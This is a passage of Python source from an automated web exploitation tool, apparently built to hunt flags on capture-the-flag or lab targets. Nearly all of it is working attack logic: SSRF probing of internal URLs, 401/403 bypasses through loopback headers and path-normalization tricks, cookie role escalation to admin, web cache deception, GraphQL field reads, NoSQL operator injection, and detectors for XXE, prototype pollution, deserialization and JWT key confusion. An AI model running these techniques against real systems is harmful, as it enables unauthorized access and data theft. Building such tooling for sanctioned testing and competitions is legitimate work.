        """[candidate]: per SSRF parameter (SSRF_PARAMS at most) a plain baseline (the offered value, only when
        it is empty or itself an inner URL; else the offered link when it was already read) and the payoffs."""
        out = []
        for base, name, value, _src in self._shape_params(pages):
            v = str(value or "")
            if not (name.lower() in SSRF_WORDS or re.match(r"(?i)https?://", v)):
                continue
            if not self.allowed(_with_query(base, name, "x"), False):
                continue
            group = f"ssrf:{base}?{name}"
            c = {"base": base, "name": name, "group": group, "offered": v, "baseline": None, "items": []}
            if not v or inner_ok(v):
                c["baseline"] = _with_query(base, name, v)
                c["items"].append((c["baseline"], "ssrf", False, group, False))
            elif self._page(_with_query(base, name, v)):
                c["baseline"] = _with_query(base, name, v)
            c["urls"] = self._ssrf_urls(pages, v)
            c["items"] += [(_with_query(base, name, u), "ssrf", True, group, False) for u in c["urls"]]
            out.append(c)
            if len(out) >= SSRF_PARAMS:
                break
        return out

    @staticmethod
    def _json_docs(text):
        """JSON documents in a fetched body: the whole text, a <pre>/<code>/<textarea> block, or the span from
        the first { or [ to the last } or ]."""
        t = _html.unescape(str(text or ""))
        cands = [t.strip()]
        cands += [m.group(1).strip() for m in re.finditer(r"(?is)<(?:pre|code|textarea)\b[^>]*>(.*?)</(?:pre|code|"
                                                          r"textarea)>", t)]
        m = re.search(r"(?s)[\[{].*[\]}]", t)
        if m:
            cands.append(m.group(0))
        out = []
        for cnd in cands:
            if cnd[:1] in ("{", "["):
                try:
                    out.append(_security_json.loads(cnd, max_chars=LEGACY_TEXT_MAX))
                except Exception:
                    pass
        return out

    @staticmethod
    def _routes_in(doc, depth=0):
        """Absolute paths a JSON document names, as values or keys."""
        out = []
        if depth > 6:
            return out
        items = list(doc.items()) if isinstance(doc, dict) else [(None, v) for v in doc[:200]] \
            if isinstance(doc, list) else [(None, doc)]
        for k, v in items:
            for s in (k, v):
                if isinstance(s, str) and s.startswith("/") and not s.startswith("//") and len(s) <= 160 \
                        and not any(ch in s for ch in " {}<>\"'\\") and not _is_asset(s) and s != "/":
                    out.append(s)
            if isinstance(v, (dict, list)):
                out += _Hunter._routes_in(v, depth + 1)
        return out

    @staticmethod
    def _listing_lines(text):
        t = _html.unescape(str(text or ""))
        blocks = [m.group(1) for m in re.finditer(r"(?is)<pre\b[^>]*>(.*?)</pre>", t)] or [re.sub(r"<[^>]+>", "\n", t)]
        out = []
        for b in blocks:
            for line in b.splitlines():
                s = line.strip()
                if s and s not in (".", "..", "./", "../") and re.fullmatch(r"[\w\-.]+/?", s) and s not in out:
                    out.append(s)
        return out[:SSRF_HOP]

    def _ssrf_hop(self, cands):
        """Wave 8: per SSRF parameter, the routes an internal ROOT it fetched lists in JSON, and each line of a
        '/'-ending inner URL's listing; minus what the baseline already shows; SSRF_HOP at most."""
        items = []
        for c in cands:
            bl = self._page(c["baseline"]) if c.get("baseline") else None
            btext = _html.unescape((bl or {}).get("text") or "")
            hop = []
            for u in c.get("urls") or []:
                pg = self._page(_with_query(c["base"], c["name"], u))
                if not pg or not pg.get("text") or pg.get("status") not in (200, None):
                    continue
                sp = urllib.parse.urlsplit(u)
                if sp.scheme.lower() in ("http", "https") and sp.path in ("", "/"):
                    for doc in self._json_docs(pg["text"]):
                        for r in self._routes_in(doc):
                            if f'"{r}"' not in btext:
                                hop.append(urllib.parse.urljoin(u, r))
                if u.endswith("/"):
                    blines = set(self._listing_lines(btext)) if btext else set()
                    hop += [u + ln for ln in self._listing_lines(pg["text"]) if ln not in blines]
            hop = [h for h in dict.fromkeys(hop) if inner_ok(h) and h not in (c.get("urls") or [])
                   and h != c.get("offered")][:SSRF_HOP]
            items += [(_with_query(c["base"], c["name"], h), "ssrf", True, c["group"], False) for h in hop]
        return items

    def _header_items(self, pages):
        """Per same-host path that answered 401/403 (HEADER_PATHS at most): the path with each loopback header,
        and '/' with X-Original-URL naming it. The plain 401/403 page and '/' are the controls.

        An exact feature/secondary route from this target's clue document gets the trusted GET policy.  This is
        deliberately carried on the generated wave item as well as checked here: otherwise a benign synthetic
        name such as `/submit-<variant>` passes selection and is refused again at send time.  Guessed routes and
        clue-advertised fatal actions remain blocked.
        """
        doc = self._clues_doc()
        trusted_routes = self._clue_advertised_routes(doc)
        denied = []
        for pg in pages:
            p = pg.get("path")
            trusted = p in trusted_routes
            if (pg.get("status") in (401, 403) and all(p != old for old, _trusted in denied)
                    and self.allowed(p, True, trusted=trusted)):
                denied.append((p, trusted))
        items = []
        for d, trusted in denied[:HEADER_PATHS]:
            group = "header:" + d
            for tag, h in LOOPBACK_HEADERS:
                items.append((d, "header", True, group, True, dict(h), f"hdr:{tag}", trusted))
            items.append(("/", "header", True, group, True,
                          {"X-Original-URL": d}, f"hdr:xou:{d}", False))
        return items

    def _clue_advertised_routes(self, doc):
        """Every exact query-free route the clue document advertises under a ``*_route`` key (B-236).

        The header wave's trusted GET policy covers each of them, not only ``feature_route`` and
        ``secondary_route`` (Day 23: an advertised ``/submit-<hex>`` must reach its loopback-header GET).
        Only the top-level string value of a key ending in ``_route`` counts; ``allowed(trusted=True)`` still
        refuses fatal actions, other origins and unsafe encodings.
        """
        if not isinstance(doc, dict):
            return set()
        out = set()
        for key in list(doc)[:64]:
            if not isinstance(key, str):
                continue
            if not re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", key).lower().endswith("_route"):
                continue
            route = self._clue_route(doc, key)
            if route and "?" not in route:
                out.add(route)
        return out

    def _cookie_items(self, pages):
        """Per READ endpoint (COOKIE_ENDPOINTS at most; 401/403 paths first): the ORIGINAL cookies first (no
        payoff), then each raised cookie (a role word -> admin; a base64 or plain JSON object -> jwt_raise)."""
        try:
            jar = [(c.name, c.value) for c in self.client._jar]
        except Exception:
            return []
        raises = [(n, nv) for n, v in jar for nv in cookie_raises(v)][:4]
        if not raises:
            return []
        items = []
        orig = "; ".join(f"{n}={v}" for n, v in jar)
        for ep in self._read_endpoints(pages)[:COOKIE_ENDPOINTS]:
            group = "cookie:" + ep
            items.append((ep, "cookie", False, group, True, {"Cookie": orig}, "ck:orig"))
            for i, (n, nv) in enumerate(raises):
                d = dict(jar)
                d[n] = nv
                items.append((ep, "cookie", True, group, True, {"Cookie": "; ".join(f"{k}={x}" for k, x in d.items())},
                              f"ck:{i}"))
        return items

    def _exposed_items(self):
        """The common exposed files no page links, one group (all of them are read, so a second proof shows)."""
        return [(p, "exposed", True, "exposed", False) for p in EXPOSED_PATHS if p not in self.pages]

    # -- the reference-technique build: path bypass, cache deception, GraphQL field-read (READ-ONLY GET) -----
    def _path_bypass_items(self, pages):
        """401/403 path-normalization bypass (READ-ONLY GET): the access wave's PATH half (the header half is
        _header_items). Per path the site denied with 401/403 (BYPASS_PATHS at most), request normalized
        spellings a permissive front-end may route to the same backend -- a trailing dot or slash, a matrix
        ';'/'..;' segment, an encoded slash or dot, a case flip, an added static extension. The plain 401/403
        page is the control; each spelling is a payoff. One group per denied path, so a second proof from a
        path still turns the answer to None. GET only; the destructive guard still refuses every spelling."""
        denied = []
        for pg in pages:
            p = pg.get("path")
            if pg.get("status") in (401, 403) and p not in denied and self.allowed(p, True):
                denied.append(p)
        items = []
        for d in denied[:BYPASS_PATHS]:
            b = d.split("?", 1)[0].rstrip("/")
            if not b:
                continue
            head, _, seg = b.rpartition("/")
            group = "bypass:" + b
            cap = seg.capitalize()
            variants = [b + "/", b + "/.", b + "/./", b + "%2f", b + "/%2e", b + ";/", b + "..;/",
                        (head + "/..;/" + seg) if head and seg else None, b + "%20", b + "%09", "/." + b,
                        (head + "/%2e/" + seg) if head and seg else None, b + ".json", b + ".css",
                        (head + "/" + seg.upper()) if seg and seg.upper() != seg else None,
                        (head + "/" + cap) if seg and cap != seg else None]
            n = 0
            for v in variants:
                if n >= BYPASS_MAX:
                    break
                if v and not v.startswith("//") and v not in self.pages and self.allowed(v, True):
                    items.append((v, "bypass", True, group, True))
                    n += 1
        return items

    def _cache_deception(self, pages):
        """Web cache deception (path confusion), READ-ONLY GET. Per personalized page the site links, request
        confusion variants that make a permissive front-end serve the authenticated content under a cache-
        friendly URL (a static-looking suffix, a ';' matrix segment, an encoded slash). The DIRECT page is the
        non-payoff control, so a proof it shows anyway is the site's own and is not banked; the variants are
        payoffs. A random marker per base keeps each request harmless. One group per base."""
        if self._gone():
            return []
        bases, seen = [], set()
        for pg in pages:
            for p in self.links(pg) + self.text_paths(pg):
                b = p.split("?", 1)[0].rstrip("/")
                if not b or _is_asset(b) or b in seen or not _PERSONAL.search(b):
                    continue
                if not self.allowed(b, True):
                    continue
                seen.add(b)
                bases.append(b)
        items = []
        for b in bases[:CACHE_BASES]:
            mark = "cd" + os.urandom(4).hex()
            seg = b.rsplit("/", 1)[-1] or "index"
            group = "cachedecept:" + b
            # the direct page is the control (non-payoff): a proof it shows is the site's own
            items.append((b, "cachedecept", False, group, True))
            for suf in (f"/{mark}.css", f"/{mark}.js", ".css", f";{mark}.css", f"%2f{mark}.css", f"/{seg}.css"):
                v = b + suf
                if self.allowed(v, False) and v not in self.pages:
                    items.append((v, "cachedecept", True, group, False))
        return items

    @staticmethod
    def _gql_unwrap(t):
        """(base kind, base name) for a GraphQL __Type, unwrapping NON_NULL/LIST ofType chains (bounded)."""
        for _ in range(8):
            if not isinstance(t, dict):
                return None, None
            if t.get("kind") in ("NON_NULL", "LIST") and isinstance(t.get("ofType"), dict):
                t = t["ofType"]
                continue
            return t.get("kind"), t.get("name")
        return None, None

    @staticmethod
    def _gql_required(args):
        """True when any argument is NON_NULL (a field that needs an argument is not auto-read)."""
        for a in args or []:
            if isinstance(a, dict) and isinstance(a.get("type"), dict) and a["type"].get("kind") == "NON_NULL":
                return True
        return False

    def _graphql_endpoints(self):
        """Up to GQL_MAX_ENDPOINTS GraphQL endpoints: any 'graphql' path already seen or a JSON page names
        first, then the common guesses, each past the destructive guard."""
        found = []
        for key in list(self.pages):
            base = key.split("\x00", 1)[0].split("?", 1)[0]
            if "graphql" in base.lower() and base not in found:
                found.append(base)
        for r in self._json_routes([pg for pg in (self._page(p) for p in list(self.pages)) if pg]):
            if "graphql" in r.lower() and r not in found:
                found.append(r)
        out = []
        for p in found + [g for g in GQL_ENDPOINTS if g not in found]:
            if self.allowed(p, False) and p not in out:
                out.append(p)
        return out[:GQL_MAX_ENDPOINTS]

    def _graphql_from_schema(self, schema):
        """[(field name, selection)] for Query-root fields readable over GET with no required argument: a
        scalar/enum field as `name`, an object field as `name { <scalar subfields> } ` (one level deep)."""
        types = schema.get("types") if isinstance(schema.get("types"), list) else []
        qname = ((schema.get("queryType") or {}).get("name")) or "Query"
        bytype = {t.get("name"): t for t in types if isinstance(t, dict) and t.get("name")}
        qtype = bytype.get(qname)
        out = []
        if not isinstance(qtype, dict):
            return out
        for f in qtype.get("fields") or []:
            if not isinstance(f, dict) or not f.get("name") or str(f["name"]).startswith("__"):
                continue
            if self._gql_required(f.get("args")):
                continue
            name = f["name"]
            kind, tname = self._gql_unwrap(f.get("type"))
            if kind in ("SCALAR", "ENUM"):
                out.append((name, name))
            elif kind == "OBJECT" and tname in bytype:
                subs = []
                for sf in bytype[tname].get("fields") or []:
                    if not (isinstance(sf, dict) and sf.get("name") and not self._gql_required(sf.get("args"))):
                        continue
                    sk, _n = self._gql_unwrap(sf.get("type"))
                    if sk in ("SCALAR", "ENUM"):
                        subs.append(sf["name"])
                    if len(subs) >= GQL_SUBFIELDS:
                        break
                if subs:
                    out.append((name, name + " { " + " ".join(subs) + " }"))
            if len(out) >= GQL_FIELDS:
                break
        return out

    def _graphql_from_suggestions(self, ep):
        """Field names from the server's own 'Did you mean' suggestions (Apollo/graphql-js) when introspection
        is off: one wrong field in a GET query; the error text names the real fields (a non-payoff probe). The
        JSON error strings are read UNESCAPED (the quotes around a name are `\\"` in the raw body), with the raw
        text as a fallback."""
        wrong = "zq" + os.urandom(4).hex()
        pg = self.fetch(ep + "?" + urllib.parse.urlencode({"query": "{ " + wrong + " }"}), "graphql", False,
                        "graphql-suggest:" + ep, tag="gqlsuggest")
        text = (pg or {}).get("text") or ""
        sources = [text]

        def collect(o):
            if isinstance(o, dict):
                for k, v in o.items():
                    if str(k).lower() == "message" and isinstance(v, str):
                        sources.append(v)
                    else:
                        collect(v)
            elif isinstance(o, list):
                for v in o[:200]:
                    collect(v)
        collect(self.json_of(pg))
        names = []
        for src in sources:
            for m in re.finditer(r"(?i)did you mean\s+([^.?\n]+)", src):
                for nm in re.findall(r"[\"'`]([A-Za-z_][A-Za-z0-9_]*)[\"'`]", m.group(1)):
                    if nm not in names and not nm.startswith("__"):
                        names.append(nm)
        return [(n, n) for n in names[:GQL_FIELDS]]

    def _graphql_read(self):
        """GraphQL auto field-read over GET (+ field-suggestion enum), READ-ONLY. Introspect the schema with a
        GET query (a NON-payoff control), then GET-read every Query-root scalar/object field that needs no
        required argument (a payoff each); when introspection is disabled, enumerate field names from the
        server's own 'Did you mean' suggestions. A proof read from a field answer is banked under the one-proof
        rule; the schema read is the control, so a proof shown only in the schema is a decoy and is never
        banked. GET only -- a GraphQL MUTATION is a POST (forbidden over GET by the spec) and is never built.
        Returns True once a proof shows."""
        introspect = ("query{__schema{queryType{name}types{name kind fields{name args{name type{kind}}"
                      "type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}")
        for ep in self._graphql_endpoints():
            pg = self.fetch(ep + "?" + urllib.parse.urlencode({"query": introspect}), "graphql", False,
                            "graphql-introspect:" + ep, tag="gqlintrospect")
            doc = self.json_of(pg)
            data = doc.get("data") if isinstance(doc, dict) else None
            schema = data.get("__schema") if isinstance(data, dict) else None
            fields = self._graphql_from_schema(schema) if isinstance(schema, dict) else []
            if not fields:
                fields = self._graphql_from_suggestions(ep)
            group = "graphqlread:" + ep
            for i, (_name, selection) in enumerate(fields[:GQL_FIELDS]):
                if not self._may_send():
                    return False
                self.fetch(ep + "?" + urllib.parse.urlencode({"query": "{ " + selection + " }"}),
                           "graphqlread", True, group, tag=f"gqr{i}")
                if self.done():
                    return True
                if self._payoff_terminal():      # ambiguous/non-wire novel payoff: no later read can fix it
                    return False
        return False

    # -- wave 11: the Day-24 SAFE breadth (GET-only / read-only DETECTORS; flag always None) ----------------
    def _finding(self, cls, confirmed, evidence, *, note=None, **extra):
        """Record one breadth DETECTOR lead for the web agent. Paths only, never a host (the log rule). This is
        NEVER a proof: it does not touch self.payoff/self.seen and cannot change the hunt's answer."""
        row = {"class": cls, "confirmed": bool(confirmed), "evidence": evidence}
        for k, v in extra.items():
            if v is not None:
                row[k] = v
        if note:
            row["note"] = str(note)[:400]
        self.findings.append(row)

    def _breadth(self, pages):
        """Run each enabled SAFE breadth detector. GET-only reads + offline classification; no POST, no state
        change, no proof banked. Any detector may raise; one failing never stops the others or the hunt."""
        for cls, fn in (("graphql", self._graphql_detect), ("nosql", lambda: self._nosql_detect(pages)),
                        ("xxe", lambda: self._xxe_detect(pages)), ("proto", lambda: self._proto_detect(pages)),
                        ("deser", lambda: self._deser_detect(pages)),
                        ("jwtconf", lambda: self._jwtconf_detect(pages))):
            if not EXPLOIT_CLASSES.get(cls):
                continue
            try:
                fn()
            except Exception:
                pass
            if self._payoff_terminal():
                return

    def _graphql_detect(self):
        """GraphQL introspection via a READ-ONLY GET (the `query` URL parameter): records a finding when the
        schema or a __typename comes back. Mutations stay POST (the GraphQL hand tool), never auto-fired."""
        cands = ["/graphql", "/api/graphql", "/graphiql", "/graphql/console"]
        for key in list(self.pages):
            base = key.split("\x00", 1)[0].split("?", 1)[0]
            if "graphql" in base and base not in cands:
                cands.append(base)
        ec = _exploit_classes()
        for path in cands[:2]:
            if not self.allowed(path, False):
                continue
            probes = (ec.graphql_get_probes(path) if ec else
                      [{"kind": "typename", "query": urllib.parse.urlencode({"query": "{ __typename }"})},
                       {"kind": "introspection",
                        "query": urllib.parse.urlencode({"query": "query{__schema{types{name}}}"})}])
            for d in probes:
                pg = self.fetch(path + "?" + d["query"], "graphql", False, "graphql-detect",
                                tag="gql:" + str(d.get("kind")))
                doc = self.json_of(pg)
                data = doc.get("data") if isinstance(doc, dict) else None
                sch = data.get("__schema") if isinstance(data, dict) else None
                types = sch.get("types") if isinstance(sch, dict) else None
                if isinstance(types, list) and types:
                    names = [t.get("name") for t in types if isinstance(t, dict) and t.get("name")][:40]
                    self._finding("graphql", True, "introspection", path=path, types=names,
                                  note="the GraphQL schema is exposed to a GET introspection query; enumerate and "
                                       "read a field with the GraphQL POST hand tool. A mutation is a "
                                       "POST and stays player-gated.")
                    return
                if isinstance(data, dict) and isinstance(data.get("__typename"), str):
                    self._finding("graphql", True, "typename", path=path, typename=data["__typename"],
                                  note="a GraphQL endpoint answers a GET query; try full introspection with the "
                                       "hand tool. Mutations stay POST (gated).")
                    return

    def _nosql_detect(self, pages):
        """A NoSQL boolean oracle on a GET search/filter parameter (read-only GETs): a bracket operator
        ($ne/$gt/$regex) that returns records absent from the control is a hit. When exactly one novel strict
        proof exists inside those extra records, promote that response to a payoff and close cold. The POST
        login-bypass stays a hand tool and is never auto-fired."""
        targets = [(b, n) for b, n, v, src in self._params(pages)
                   if not _looks_like_url_value(v) and (n.lower() in SEARCH_WORDS or src == "form1")][:1]
        if not targets:
            return
        base, name = targets[0]
        ec = _exploit_classes()
        probes = (ec.nosql_get_probes(name) if ec else
                  [{"kind": "control", "query": urllib.parse.urlencode({name: "znone0"})},
                   {"kind": "boolean", "query": urllib.parse.urlencode({name + "[$ne]": "znone0"}, safe="[]$")}])
        baseline_proofs = set(self.seen)
        bykind = {}
        for d in probes:
            pg = self.fetch(base + "?" + d["query"], "nosql", False, "nosql-detect",
                            tag="nq:" + d["kind"] + d["query"][:10])
            bykind.setdefault(d["kind"], []).append(pg)
        ctrl = next((p for p in bykind.get("control", []) if p), None)
        if ctrl is None:
            return
        ct, cl = ctrl.get("status"), len(ctrl.get("text") or "")
        cltext = (ctrl.get("text") or "").lower()
        empty_words = ("no result", "not found", "no match", "invalid", "empty", "0 result", "no user")
        control_doc = self.json_of(ctrl)

        def records(value):
            if isinstance(value, list):
                return value
            if not isinstance(value, dict):
                return None
            for key in ("results", "items", "users", "records", "data", "rows", "entries", "matches",
                        "documents"):
                if isinstance(value.get(key), list):
                    return value[key]
            lists = [v for v in value.values() if isinstance(v, list)]
            return lists[0] if len(lists) == 1 else None

        control_records = records(control_doc)
        control_sigs = ({json.dumps(v, sort_keys=True, separators=(",", ":"), default=str)[:8192]
                         for v in control_records} if control_records is not None else None)
        control_proofs = scan_for_baseline_proofs(ctrl.get("text") or "", self.host)
        oracle_proofs, strong_hits = set(), []
        for pg in bykind.get("boolean", []):
            if not pg:
                continue
            bt, bl = pg.get("status"), len(pg.get("text") or "")
            btext = (pg.get("text") or "").lower()
            extra = None
            injected_records = records(self.json_of(pg))
            if control_sigs is not None and injected_records is not None:
                extra = [value for value in injected_records
                         if json.dumps(value, sort_keys=True, separators=(",", ":"), default=str)[:8192]
                         not in control_sigs]
                for value in extra:
                    oracle_proofs |= scan_for_proofs(
                        json.dumps(value, sort_keys=True, separators=(",", ":"), default=str), self.host)
            strong = (ct == 200 and bt == 200 and
                      (bool(extra)
                       or bl > cl * 2 + 64
                       or (any(w in cltext for w in empty_words) and not any(w in btext for w in empty_words))))
            if strong:
                if extra is None:  # non-JSON fallback: only response novelty can be a payoff
                    oracle_proofs |= scan_for_proofs(pg.get("text") or "", self.host) - control_proofs
                strong_hits.append(pg)
                continue
            if bt != ct or abs(bl - cl) > 16:
                self._finding("nosql", False, "possible_differential", path=base.split("?", 1)[0], param=name,
                              note="the operator response differs from the control; a lead for the NoSQL hand tool.")
        if not strong_hits:
            return
        novel = {p for p in oracle_proofs if p not in baseline_proofs and p not in control_proofs}
        self._finding("nosql", True, "boolean_differential", path=base.split("?", 1)[0], param=name,
                      novel_proofs=sorted(novel)[:4],
                      note="a $ne/$gt/$regex GET operator returns records absent from the control. A sole novel "
                           "lowercase proof is banked; POST login bypass remains agent-only.")
        if len(novel) != 1:
            return
        proof = next(iter(novel))
        # fetch() conservatively recorded detector responses as plain. The snapshot above proves this value was
        # absent from every earlier baseline/control, so reclassify only this one value as the anchored payoff.
        with self.lock:
            self.plain.discard(proof)
            self.payoff[proof] = (strong_hits[0].get("path"), "nosql", "nosql-oracle")
            if self.hit_group is None:
                self.hit_group = "nosql-oracle"

    def _xxe_detect(self, pages):
        """An XML attack surface in a response already read by GET (offline): a lead for the POST/OOB XXE hand
        tool. The entity read is a POST body + OOB exfil and is player-gated; nothing is sent here."""
        ec = _exploit_classes()
        for pg in pages:
            ct = pg.get("ctype") or ""
            body = (pg.get("text") or "")
            if ec:
                sig = ec.xxe_surface_signals(ct, body)
            else:
                head = body[:4096]
                doctype = bool(re.search(
                    r"(?is)<!DOCTYPE\s+(?:(?!html(?:\s|>))[A-Za-z_:][\w:.-]*|"
                    r"html\b[^>]*(?:\b(?:SYSTEM|PUBLIC)\b|\[))",
                    head,
                ))
                sig = {"xml": (("xml" in ct.lower())
                               or bool(re.search(r"^\s*<\?xml\b", head, re.I))
                               or doctype or bool(re.search(r"(?i)<!ENTITY\b", body)))}
            if sig.get("xml"):
                self._finding("xxe", False, "xml_surface", path=pg.get("path", "").split("?", 1)[0],
                              note="an XML response surface: try the POST/OOB XXE hand tool (the XXE generators / "
                                   "xxe_oob_dtd); the entity read is a POST body and is player-gated.")
                return

    def _proto_detect(self, pages):
        """A JSON-merge surface (offline): POST/PUT/PATCH routes /openapi.json names with a request body are
        candidates for prototype pollution. Detection ONLY -- the benign canary WRITE stays a hand tool
        (proto_pollution_payloads); the live GET path never writes it (no state change)."""
        routes = []
        spec = self.json_of(self._page(self.openapi_route))
        paths = spec.get("paths") if isinstance(spec, dict) else None
        if isinstance(paths, dict):
            for p, methods in paths.items():
                if not (isinstance(p, str) and p.startswith("/") and isinstance(methods, dict)):
                    continue
                for m, mo in methods.items():
                    if str(m).lower() in ("post", "put", "patch") and isinstance(mo, dict) and mo.get("requestBody"):
                        routes.append(p)
                        break
        routes = list(dict.fromkeys(routes))[:4]
        if routes:
            self._finding("proto", False, "json_merge_candidate", routes=routes,
                          note="JSON-body endpoints that may merge input: send the benign canary with the "
                               "prototype-pollution HAND TOOL (proto_pollution_payloads). The live GET path does "
                               "not write the canary (no state change).")

    def _deser_detect(self, pages):
        """A serialized-object blob in a cookie, a Set-Cookie or a GET parameter value (offline wire-signature
        recognition). BLIND DETECT only; the timing/gadget exploit stays a hand tool (java_deser.py), gated."""
        ec = _exploit_classes()
        pairs = []
        try:
            for ck in list(self.client._jar):
                if ck.value:
                    pairs.append(("cookie:" + ck.name, ck.value))
        except Exception:
            pass
        for pg in pages:
            for k, v in (pg.get("headers") or {}).items():
                if k.lower() == "set-cookie":
                    part = str(v).split(";", 1)[0]
                    if "=" in part:
                        nm, val = part.split("=", 1)
                        pairs.append(("set-cookie:" + nm.strip(), val.strip()))
            for link in self.links(pg):
                for pk, pv in urllib.parse.parse_qsl(link.partition("?")[2], keep_blank_values=True):
                    if pv:
                        pairs.append(("param:" + pk, pv))
        seen = set()
        for where, value in pairs:
            tag = (where, str(value)[:24])
            if tag in seen:
                continue
            seen.add(tag)
            r = ec.classify_serialized_blob(value) if ec else {"serialized": False}
            if r.get("serialized"):
                self._finding("deser", False, "serialized_blob", where=where, kind=r.get("kind"),
                              encoding=r.get("encoding"),
                              note="a serialized object in a cookie/param: BLIND DETECT only; the timing/gadget "
                                   "exploit stays a hand tool (java_deser.py), player-gated.")
                return

    def _jwtconf_detect(self, pages):
        """JWT confusion fallback after the bounded cold replay missed.

        One RS/ES/PS token plus one readable public key is already tried by
        ``_jwt_items`` against target-described read endpoints.  Hosted
        jku/x5u, ambiguous tokens/keys and every write path remain findings for
        the gated agent path only.
        """
        toks = self._jwt_tokens(pages)
        if not toks:
            return
        for _tok, dec, _cookie in toks:
            hdr = (dec.get("header") or {}) if isinstance(dec, dict) else {}
            if hdr.get("jku") or hdr.get("x5u"):
                self._finding("jwtconf", False, "jku_x5u_header",
                              note="the token header carries jku/x5u: a hosted-JWKS forge (jwt_jku_forge) needs "
                                   "the player's collector (tools/oob.py up --public) and is GATED.")
                return
        asym = [d for _t, d, _c in toks
                if isinstance(d, dict)
                and str((d.get("header") or {}).get("alg", "")).upper()[:2] in ("RS", "ES", "PS")]
        if not asym:
            return
        if self._jwt_public_keys(pages):
            self._finding("jwtconf", False, "rs256_confusion_candidate",
                          note="an asymmetric (RS/ES/PS) token AND a readable public key: an RS256->HS256 "
                               "confusion is a READ replay (web.forge_jwt_hs_confusion / exploit_classes."
                               "jwt_rs256_confusion); the exact cold replay already missed, so retain it as "
                               "agent evidence rather than broadening the automatic endpoint/key choice.")


def _prompt_texts(ctx):
    """The start's own texts: ctx['prompt'], then the start.json beside ctx['log_dir'] (its prompt and question
    texts)."""
    texts = []
    if isinstance(ctx.get("prompt"), str):
        texts.append(ctx["prompt"])
    try:
        if ctx.get("log_dir"):
            sp = Path(ctx["log_dir"]).parent / "start.json"
            if sp.is_file():
                st = json.loads(sp.read_text())
                texts.append(str(st.get("prompt") or ""))
                texts += [str(q.get("question") or "") for q in st.get("questions") or [] if isinstance(q, dict)]
    except Exception:
        pass
    return texts


def _files_from(ctx):
    """(paths, refused): every absolute filesystem path the start's own text names, any extension or none
    (Day 4: 'the attempt proof is mounted at /run/huntress/objective.txt'; round 2, row 393: not only *.txt),
    read from ctx['prompt'] or the start.json beside ctx['log_dir'] (its prompt and question texts);
    `prompt_paths` has the rule and the destructive-word guard."""
    out, refused = [], []
    for t in _prompt_texts(ctx):
        keep, bad = prompt_paths(t)
        out += [p for p in keep if p not in out]
        refused += [p for p in bad if p not in refused]
    return out, refused


def solve_targets(targets, ctx=None):
    """The contract (module text). Never raises."""
    out = {}
    try:
        ctx = dict(ctx or {})
        valid = [t for t in list(targets or []) if isinstance(t, dict) and t.get("answer_id") and t.get("url")]
    except Exception:
        return out
    try:
        deadline = float(ctx["deadline"]) if ctx.get("deadline") is not None else None
    except (TypeError, ValueError):
        deadline = None
    try:
        raw_max_requests = ctx["max_requests"] if "max_requests" in ctx else 400
        max_requests = 400 if raw_max_requests is None else max(0, int(raw_max_requests))
    except (TypeError, ValueError):
        max_requests = 400
    try:
        files, refused_files = _files_from(ctx)
    except Exception:
        files, refused_files = [], []
    try:
        prompt = "\n".join(_prompt_texts(ctx))
    except Exception:
        prompt = ""
    get_only = bool(ctx.get("get_only"))   # B-007: a caller (the web lane) forces every send to GET
    stop = threading.Event()
    hunters, results = {}, {}

    def one(t):
        aid = t["answer_id"]
        try:
            h = _Hunter(str(t["url"]), deadline=deadline, max_requests=max_requests, stop=stop, files=files,
                        refused_files=refused_files, prompt=prompt, get_only=get_only)
            # A one-target prompt is target-local. In Mastery, shared prompt
            # prose cannot authorize a POST on every target; only that target's
            # own question and self-description cross the mutation boundary.
            h.post_prompt = prompt if len(valid) == 1 else str(t.get("question") or "")[:20_000]
            h.forge_target = dict(t)
            h.forge_ctx = {"log_dir": ctx.get("log_dir"), "challenge": ctx.get("challenge")}
            hunters[aid] = h
            value = h.run()
            # The coordinator may have closed the timed run while this daemon
            # was finishing bounded offline analysis. Never publish a late
            # result into the answer set after that shared stop.
            results[aid] = None if stop.is_set() else value
        except Exception:
            results[aid] = None

    threads = [threading.Thread(target=one, args=(t,), name=f"proof-hunt-{t['answer_id']}", daemon=True)
               for t in valid]
    for th in threads:
        th.start()
    for th in threads:
        th.join(timeout=None if deadline is None else max(0.05, deadline - time.time()))
    stop.set()
    # Close every direct Hunter send gate before observing results. stop_now
    # waits for reserved wire calls. A timed run must not then wait without a
    # bound for optional offline analysis: daemon workers see the stop flag,
    # discard any late result, and cannot reserve another request.
    for hunter in list(hunters.values()):
        hunter.stop_now()
    if deadline is None:
        for th in threads:
            th.join()
    else:
        drain_until = min(deadline, time.time() + 0.25)
        for th in threads:
            th.join(timeout=max(0.0, drain_until - time.time()))
    for t in valid:
        v = results.get(t["answer_id"])
        out[t["answer_id"]] = v if is_proof(v) else None
    # A different-shaped token from an explicitly successful exploit is useful
    # evidence for the live agent, but exact_text gives us no safe basis to bank
    # it automatically.  Persist it, expose it through ctx when supplied, and
    # print one bounded line so both Layer 1 and `web_agent.py hunt` surface it.
    evidence = ctx.get("evidence")
    for t in valid:
        aid = t["answer_id"]
        h = hunters.get(aid)
        if h is not None and out.get(aid):
            h.candidates = [item for item in (h.candidates or [])
                            if str(item.get("value") if isinstance(item, dict) else item) != out[aid]]
        for item in list(getattr(h, "candidates", []) or [])[:6]:
            value = str(item.get("value") if isinstance(item, dict) else item)
            value = _web.safe_display_text(value, 256)
            line = _web.safe_display_text(
                f"WEB PROOF CANDIDATE {aid}: {value} (successful response; not auto-submitted)", 600)
            if isinstance(evidence, list) and line not in evidence:
                evidence.append(line)
            print(line, file=sys.stderr)
    # The hunt has consumed every response.  Keep route/status diagnostics but
    # remove credential-bearing JSON/form fields and auth/cookie headers before
    # class hints, handoff evidence, or persistent logs can observe them.
    for h in list(hunters.values()):
        redact = getattr(getattr(h, "client", None), "redact_log", None)
        if callable(redact):
            try:
                redact()
            except Exception:
                pass
    # Row 558: for an id with no proof, one class-hint line from the responses already in hand (no request).
    for t in valid:
        aid = t["answer_id"]
        h = hunters.get(aid)
        if h is None or out.get(aid) or getattr(h, "client", None) is None:
            continue
        hint = class_hint(getattr(h.client, "log", None))
        h.class_hint = hint
        if hint:
            line = _web.safe_display_text(f"WEB CLASS HINT {aid}: {hint['line']} (no proof; evidence only)", 600)
            if isinstance(evidence, list) and line not in evidence:
                evidence.append(line)
            print(line, file=sys.stderr)
    # Day 31 / backlog row 607.  Surface one *candidate*, never an answer, to
    # the in-process Layer 1 caller.  It is deliberately derived from this
    # hunt's Hunter objects rather than by rereading proof_hunt.jsonl, so a
